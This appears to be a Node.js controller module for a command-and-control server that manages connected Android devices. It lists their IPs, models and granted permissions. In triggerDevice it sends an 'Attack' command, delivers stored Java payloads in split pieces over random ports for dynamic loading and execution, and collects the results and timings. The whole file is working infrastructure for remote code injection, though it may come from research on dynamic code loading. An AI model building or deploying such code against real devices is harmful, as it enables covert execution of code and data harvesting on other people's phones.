const payloads = require('../database/models/payload');
const attacks = require('../database/models/attackResult');
const socketManager = require('./socketManager');
const codeUtil = require('../utils/codeUtil');
const secrets = require('../secrets.json');


const HOSTNAME = process.env.HOSTNAME || secrets.serverHostName || "localhost";


async function showAllDevices() {
    return new Promise((resolve, reject) => {
        const socketsMap = socketManager.getDeviceConnectedToSocketMain();
        let devices = [];

        socketsMap.forEach((socketInfo, port) => {
            devices.push({
                ip: socketInfo.socket.remoteAddress,
                port: port,
                model: socketInfo.model,
                api : socketInfo.api,
                permissions : socketInfo.permissions,
                permissionsGranted : socketInfo.permissionsGranted,
                deviceImage : socketInfo.schifo
            });
        });

        resolve(devices);
    });
}
async function triggerDevice(device, payload_id, payloadArgs) {
    console.log(device)
    console.log(payload_id)
    console.log(payloadArgs)
    return new Promise((resolve, reject) => {
        const sourcePort = device.port;

        payloads.readOneById(payload_id)
            .then( (payload) => {
                const javaCode = payload.content;
                const javaCodeMinified = codeUtil.minifyJavaCode(javaCode);
                const javaPieces = codeUtil.splitJavaCode(javaCodeMinified);
                console.log(javaPieces);

                const randomCodeSenderPorts = socketManager.requireFreeCodeSenderPorts(javaPieces.length);
                console.log(randomCodeSenderPorts);

                //build send string with hostnames and ports
                let serversListStringed = "Servers: ";
                for (let i = 0; i < javaPieces.length; i++) {
                    serversListStringed += HOSTNAME + ":" + randomCodeSenderPorts[i] + "|";
                    socketManager.openNewSocketCodeSender(randomCodeSenderPorts[i], javaPieces[i]);
                }

                const randomPortCollector = socketManager.requireFreeCollectorPort();

                socketManager.writeOnSocketMainByPort(sourcePort, "Attack");
                socketManager.writeOnSocketMainByPort(sourcePort, serversListStringed);
                socketManager.writeOnSocketMainByPort(sourcePort, 'Collector: ' + HOSTNAME + ':' + randomPortCollector);
                socketManager.writeOnSocketMainByPort(sourcePort, 'Result Type: ' +  payload.resultType);
                socketManager.writeOnSocketMainByPort(sourcePort, 'Arg: ' +  payloadArgs);
                socketManager.writeOnSocketMainByPort(sourcePort, 'Polling: ' +  1);
                socketManager.writeOnSocketMainByPort(sourcePort, 'Num: ' +  10);

                socketManager.openSocketCollectorAndWaitForResult(randomPortCollector)
                    .then((result) => {
                        const tIndex = result.toString().indexOf("Timing: ");
                        const rIndex = result.toString().indexOf("|");

                        const timingString = result.toString().substring(tIndex+8, rIndex);
                        const timings = timingString.split('~');

                        const resultString = result.toString().substring(rIndex+9);

                        const newAttack = {
                            device : device,
                            payload_id : payload_id,
                            result : resultString,
                            timing: {
                                download_time : parseFloat(timings[0]),
                                parse_time : parseFloat(timings[1]),
                                compile_time : parseFloat(timings[2]),
                                dynamic_loading_time : parseFloat(timings[3]),
                                execution_time : parseFloat(timings[4])
                            },
                            resultType: payload.resultType
                        };
                        console.log(newAttack)


                        attacks.create(newAttack);
                        resolve(newAttack);
                    })
                    .catch((error) => {
                        reject({status: 500, message: error});
                    })
                    .finally(() => {
                        socketManager.releaseCollectorPort(randomPortCollector);
                        socketManager.releaseCodeSenderPorts(randomCodeSenderPorts);
                    });
            })
            .catch((error) => {
                console.log(error);
                reject({status: 404, message: 'payload not found'})
            });
    });
}



module.exports = {
    showAllDevices,
    triggerDevice
};
